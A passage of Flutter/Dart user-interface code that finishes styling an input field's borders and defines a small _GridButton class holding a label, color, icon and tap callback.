          borderSide: BorderSide(color: ControlTheme.border.withOpacity(0.15)),
        ),
        focusedBorder: OutlineInputBorder(
          borderRadius: BorderRadius.circular(8),
          borderSide: BorderSide(color: ControlTheme.border.withOpacity(0.3)),
        ),
      ),
    );
}

class _GridButton {
  final String label;
  final Color color;
  final IconData icon;
  final VoidCallback onTap;
  
  _GridButton(this.label, this.color, this.icon, this.onTap);
}